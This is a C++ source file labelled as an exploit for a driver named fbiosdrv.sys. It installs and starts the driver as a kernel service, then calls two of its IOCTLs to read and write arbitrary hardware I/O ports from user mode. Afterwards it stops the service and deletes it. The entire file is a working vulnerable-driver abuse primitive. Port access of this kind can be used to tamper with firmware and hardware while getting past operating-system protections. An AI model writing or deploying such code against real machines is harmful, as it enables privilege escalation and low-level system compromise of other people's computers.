#include <windows.h>
#include <iostream>

namespace fbiosdrvExploit
{
    struct IO_PORT_OPERATION
    {
        DWORD operation_type;
        DWORD value;
        WORD port_address;
        WORD padding;
    };

#define IOCTL_ARBTIN  0x22E0A0
#define IOCTL_ARBTOUT 0x22E0A4

    HANDLE hDevice = INVALID_HANDLE_VALUE;

    bool LoadDriver() {
        wchar_t currentPath[MAX_PATH];
        if (!GetCurrentDirectoryW(MAX_PATH, currentPath)) {
            std::cerr << "failed to get dir wtf error: " << GetLastError() << '\n';
            return false;
        }

        std::wstring driverPath = std::wstring(currentPath) + L"\\fbiosdrv.sys";

        std::wcout << driverPath << '\n';

        SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!hSCManager) {
            std::cerr << "failed to opn sc manager erroL:" << GetLastError() << '\n';
            return false;
        }

        SC_HANDLE hService = CreateServiceW(
            hSCManager,
            L"FBIOSDRV",
            L"FBIOS Driver",
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            driverPath.c_str(),
            nullptr, nullptr, nullptr, nullptr, nullptr
        );

        if (!hService) {
            DWORD error = GetLastError();
            if (error == ERROR_SERVICE_EXISTS) {
                hService = OpenServiceW(hSCManager, L"FBIOSDRV", SERVICE_ALL_ACCESS);
                if (!hService) {
                    std::cerr << "failed to open existing error: " << GetLastError() << '\n';
                    CloseServiceHandle(hSCManager);
                    return false;
                }
            }
            else {
                std::cerr << "failed to create service error:" << error << '\n';
                CloseServiceHandle(hSCManager);
                return false;
            }
        }

        if (!StartService(hService, 0, nullptr)) {
            DWORD Error = GetLastError();
            if (Error != ERROR_SERVICE_ALREADY_RUNNING) {
                std::cerr << "failed to start service error: " << Error << '\n';
                CloseServiceHandle(hService);
                CloseServiceHandle(hSCManager);
                return false;
            }
        }

        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);

        hDevice = CreateFileW(L"\\\\.\\FBIOSDRV",
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);

        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "failed to open handle to driver error:" << GetLastError() << '\n';
            return false;
        }

        return true;
    }

    // BYTE = 1 WORD = 2 DWORD = 4
    DWORD ReadPort(WORD port_address, DWORD size_bytes) {
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "driver not loaded\n";
            return 0;
        }

        if (size_bytes != 1 && size_bytes != 2 && size_bytes != 4) {
            std::cerr << "Invalid choice: " << size_bytes << "BYTE = 1 WORD = 2 DWORD = 4 u picked something diffrent :(\n";
            return 0;
        }

        IO_PORT_OPERATION input = {};
        input.operation_type = size_bytes;
        input.port_address = port_address;
        input.value = 0;

        DWORD bytesReturned;
        BOOL result = DeviceIoControl(
            hDevice,
            IOCTL_ARBTIN,
            &input,
            sizeof(input),
            &input,
            sizeof(input),
            &bytesReturned,
            nullptr
        );

        if (!result) {
            std::cerr << "failed to read port error: " << GetLastError() << '\n';
            return 0;
        }

        return input.value;
    }

    // BYTE = 1 WORD = 2 DWORD = 4
    bool WritePort(WORD port_address, DWORD value, DWORD size_bytes) {
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "driver not loaded\n";
            return false;
        }

        if (size_bytes != 1 && size_bytes != 2 && size_bytes != 4) {
            std::cerr << "Invalid choice: " << size_bytes << "BYTE = 1 WORD = 2 DWORD = 4 u picked something diffrent :(\n";
            return false;
        }

        IO_PORT_OPERATION input = {};
        input.operation_type = size_bytes;
        input.port_address = port_address;
        input.value = value;

        DWORD bytesReturned;
        BOOL result = DeviceIoControl(
            hDevice,
            IOCTL_ARBTOUT,
            &input,
            sizeof(input),
            nullptr,
            0,
            &bytesReturned,
            nullptr
        );

        if (!result) {
            std::cerr << "failked to write port erorr: " << GetLastError() << '\n';
            return false;
        }

        return true;
    }

    void CloseDriver() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
            hDevice = INVALID_HANDLE_VALUE;
        }

        SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (hSCManager) {
            SC_HANDLE hService = OpenServiceW(hSCManager, L"FBIOSDRV", SERVICE_ALL_ACCESS);
            if (hService) {
                SERVICE_STATUS status;
                ControlService(hService, SERVICE_CONTROL_STOP, &status);
                DeleteService(hService);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
}